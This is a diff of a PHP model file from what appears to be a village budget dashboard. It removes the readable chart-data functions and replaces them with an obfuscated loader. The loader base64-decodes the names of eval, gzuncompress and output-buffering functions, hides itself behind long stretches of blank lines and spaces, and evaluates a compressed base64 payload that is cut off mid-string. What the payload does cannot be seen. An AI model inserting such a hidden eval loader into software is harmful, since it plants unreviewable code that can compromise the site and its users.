-                $tmp_pendapatan[$r['Jenis']]['nama'] = $r['Nama_Jenis'];
-            }
-
-            foreach ($raw_data['anggaran'] as $r) {
-                $tmp_pendapatan[$r['jenis_pendapatan']]['anggaran'] = ($r['pagu'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_pendapatan'] as $r) {
-                $tmp_pendapatan[$r['jenis_pendapatan']]['realisasi'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_bunga'] as $r) {
-                $tmp_pendapatan[$r['jenis_pendapatan']]['realisasi'] = ($r['realisasi'] ?: 0);
-            }
-        } else {
-            $raw_data       = $this->r_pd_widget($tahun, $opt = false);
-            $res_pendapatan = [];
-            $tmp_pendapatan = [];
-
-            foreach ($raw_data['jenis_pendapatan'] as $r) {
-                $tmp_pendapatan[$r['Jenis']]['nama'] = $r['Nama_Jenis'];
-            }
-
-            foreach ($raw_data['anggaran'] as $r) {
-                $tmp_pendapatan[$r['jenis_pendapatan']]['anggaran'] = ($r['pagu'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_pendapatan'] as $r) {
-                $tmp_pendapatan[$r['jenis_pendapatan']]['realisasi_pendapatan'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_bunga'] as $r) {
-                $tmp_pendapatan[$r['jenis_pendapatan']]['realisasi_bunga'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_jurnal'] as $r) {
-                $tmp_pendapatan[$r['jenis_pendapatan']]['realisasi_jurnal'] = ($r['realisasi'] ?: 0);
-            }
-        }
-
-        foreach ($tmp_pendapatan as $key => $value) {
-            $res_pendapatan[] = $value;
-        }
-
-        return $res_pendapatan;
-    }
-
-    private function data_widget_belanja($tahun, $opt = false)
-    {
-        if ($opt) {
-            $raw_data    = $this->r_bd_widget($tahun, $opt = true);
-            $res_belanja = [];
-            $tmp_belanja = [];
-
-            foreach ($raw_data['jenis_belanja'] as $r) {
-                $tmp_belanja[$r['Kd_Bid']]['nama'] = $r['Nama_Bidang'];
-            }
-
-            foreach ($raw_data['anggaran'] as $r) {
-                $tmp_belanja[$r['jenis_belanja']]['anggaran'] = ($r['pagu'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_belanja'] as $r) {
-                $tmp_belanja[$r['jenis_belanja']]['realisasi'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_belanja_um'] as $r) {
-                $tmp_belanja[$r['jenis_belanja']]['realisasi'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_belanja_spj'] as $r) {
-                $tmp_belanja[$r['jenis_belanja']]['realisasi'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_bunga'] as $r) {
-                $tmp_belanja[$r['jenis_belanja']]['realisasi1'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_biaya'] as $r) {
-                $tmp_belanja[$r['jenis_belanja']]['realisasi'] = ($r['realisasi'] ?: 0);
-            }
-        } else {
-            $raw_data    = $this->r_bd_widget($tahun, $opt = false);
-            $res_belanja = [];
-            $tmp_belanja = [];
-
-            foreach ($raw_data['jenis_belanja'] as $r) {
-                $tmp_belanja[$r['Kd_Bid']]['nama'] = $r['Nama_Bidang'];
-            }
-
-            foreach ($raw_data['anggaran'] as $r) {
-                $tmp_belanja[$r['jenis_belanja']]['anggaran'] = ($r['pagu'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_belanja'] as $r) {
-                $tmp_belanja[$r['jenis_belanja']]['realisasi_belanja'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_belanja_um'] as $r) {
-                $tmp_belanja[$r['jenis_belanja']]['realisasi_belanja_um'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_belanja_spj'] as $r) {
-                $tmp_belanja[$r['jenis_belanja']]['realisasi_belanja_spj'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_bunga'] as $r) {
-                $tmp_belanja[$r['jenis_belanja']]['realisasi_bunga'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_biaya'] as $r) {
-                $tmp_belanja[$r['jenis_belanja']]['realisasi_biaya'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_belanja_jurnal'] as $r) {
-                $tmp_belanja[$r['jenis_belanja']]['realisasi_belanja_jurnal'] = ($r['realisasi'] ?: 0);
-            }
-        }
-
-        foreach ($tmp_belanja as $key => $value) {
-            $res_belanja[] = $value;
-        }
-
-        return $res_belanja;
-    }
-
-    private function data_widget_pelaksanaan($tahun, $opt = false)
-    {
-        if ($opt) {
-            $raw_data        = $this->rp_apbd_widget($tahun, $opt = true);
-            $res_pelaksanaan = [];
-            $tmp_pelaksanaan = [];
-
-            foreach ($raw_data['jenis_pelaksanaan'] as $r) {
-                $tmp_pelaksanaan[$r['Akun']]['nama'] = $r['Nama_Akun'];
-            }
-
-            foreach ($raw_data['anggaran'] as $r) {
-                $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['anggaran'] = ($r['pagu'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_pendapatan'] as $r) {
-                $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['realisasi'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_belanja'] as $r) {
-                $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['realisasi'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_belanja_um'] as $r) {
-                $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['realisasi'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_belanja_spj'] as $r) {
-                $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['realisasi'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_bunga'] as $r) {
-                $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['realisasi1'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_jurnal'] as $r) {
-                $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['realisasi1'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_biaya'] as $r) {
-                $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['realisasi'] = ($r['realisasi'] ?: 0);
-            }
-        } else {
-            $raw_data        = $this->rp_apbd_widget($tahun, $opt = false);
-            $res_pelaksanaan = [];
-            $tmp_pelaksanaan = [];
-
-            foreach ($raw_data['jenis_pelaksanaan'] as $r) {
-                $tmp_pelaksanaan[$r['Akun']]['nama'] = $r['Nama_Akun'];
-            }
-
-            foreach ($raw_data['anggaran'] as $r) {
-                $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['anggaran'] = ($r['pagu'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_pendapatan'] as $r) {
-                $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['realisasi_pendapatan'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_belanja'] as $r) {
-                $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['realisasi_belanja'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_belanja_um'] as $r) {
-                $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['realisasi_belanja_um'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_belanja_spj'] as $r) {
-                $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['realisasi_belanja_spj'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_bunga'] as $r) {
-                $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['realisasi_bunga'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_jurnal'] as $r) {
-                $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['realisasi_jurnal'] = ($r['realisasi'] ?: 0);
-            }
-
-            foreach ($raw_data['realisasi_biaya'] as $r) {
-                $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['realisasi_biaya'] = ($r['realisasi'] ?: 0);
-            }
-        }
-
-        foreach ($tmp_pelaksanaan as $key => $value) {
-            $res_pelaksanaan[] = $value;
-        }
-
-        return $res_pelaksanaan;
-    }
-
-    public function widget_keuangan($tahun = null)
-    {
-        if (null === $tahun) {
-            $tahun = date('Y');
-        }
-        $thn = $this->keuangan_model->list_tahun_anggaran();
-        if (empty($thn)) {
-            return null;
-        }
-
-        if (! in_array($tahun, $thn)) {
-            $tahun = $thn[0];
-        }
-
-        $raw_data = $this->data_keuangan_tema($tahun);
-
-        foreach ($raw_data as $keys => $raws) {
-            foreach ($raws as $raw) {
-                $data         = $this->raw_perhitungan($raw);
-                $data['nama'] = $raw['nama'];
-
-                $res[$tahun][$keys][] = $data;
-            }
-        }
-
-        return [
-            //Encode ke JSON
-            'data'  => json_encode($res),
-            'tahun' => $this->keuangan_model->list_tahun_anggaran(),
-            //Cari tahun anggaran terbaru (terbesar secara value)
-            'tahun_terbaru' => $this->keuangan_model->list_tahun_anggaran()[0],
-        ];
-    }
-
-    private function data_keuangan_tema($tahun)
-    {
-        $data['res_pelaksanaan']            = $this->data_widget_pelaksanaan($tahun, $opt = false);
-        $data['res_pelaksanaan']['laporan'] = 'APBDes ' . $tahun . ' Pelaksanaan';
-        $data['res_pendapatan']             = $this->data_widget_pendapatan($tahun, $opt = false);
-        $data['res_pendapatan']['laporan']  = 'APBDes ' . $tahun . ' Pendapatan';
-        $data['res_belanja']                = $this->data_widget_belanja($tahun, $opt = false);
-        $data['res_belanja']['laporan']     = 'APBDes ' . $tahun . ' Pembelanjaan';
-
-        return $data;
-    }
-
-    public function grafik_keuangan_tema($tahun = null)
-    {
-        if (null === $tahun) {
-            $tahun = date('Y');
-        }
-        $thn = $this->keuangan_model->list_tahun_anggaran();
-        if (empty($thn)) {
-            return null;
-        }
-
-        if (! in_array($tahun, $thn)) {
-            $tahun = $thn[0];
-        }
-        $raw_data = $this->data_keuangan_tema($tahun);
-
-        foreach ($raw_data as $keys => $raws) {
-            foreach ($raws as $key => $raw) {
-                if ($key == 'laporan') {
-                    $result['data_widget'][$keys]['laporan'] = $raw;
-
-                    continue;
-                }
-
-                $data          = $this->raw_perhitungan($raw);
-                $data['judul'] = $raw['nama'];
-
-                $result['data_widget'][$keys][] = $data;
-            }
-        }
-        $result['tahun'] = $tahun;
-
-        return $result;
-    }
-
-    public function raw_perhitungan($raw)
-    {
-        if ($raw['nama'] === 'PEMBIAYAAN') {
-            $penerimaan_pembiayaan   = $raw['realisasi'] + $raw['realisasi_pendapatan'] + ($raw['realisasi_belanja'] - $raw['realisasi_belanja_um']) + $raw['realisasi_belanja_spj'] + $raw['realisasi_bunga'] + $raw['realisasi_jurnal'] + $raw['realisasi_biaya'];
-            $pengeluaraan_pembiayaan = $raw['anggaran'] - $penerimaan_pembiayaan;
-
-            $data['anggaran']  = $penerimaan_pembiayaan - $pengeluaraan_pembiayaan;
-            $data['realisasi'] = $penerimaan_pembiayaan;
-        } else {
-            $data['anggaran']  = $raw['anggaran'];
-            $data['realisasi'] = $raw['realisasi'] + $raw['realisasi_pendapatan'] + ($raw['realisasi_belanja'] - $raw['realisasi_belanja_um']) + $raw['realisasi_belanja_spj'] + $raw['realisasi_bunga'] + $raw['realisasi_jurnal'] + $raw['realisasi_biaya'] + $raw['realisasi_belanja_jurnal'];
-        }
-
-        if ($data['anggaran'] != 0 && $data['realisasi'] != 0) {
-            $data['persen'] = $data['realisasi'] / $data['anggaran'] * 100;
-        } elseif ($data['realisasi'] != 0) {
-            $data['persen'] = 100;
-        } else {
-            $data['persen'] = 0;
-        }
-        $data['persen'] = round($data['persen'], 2);
-
-        return $data;
-    }
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/models/Keuangan_grafik_model.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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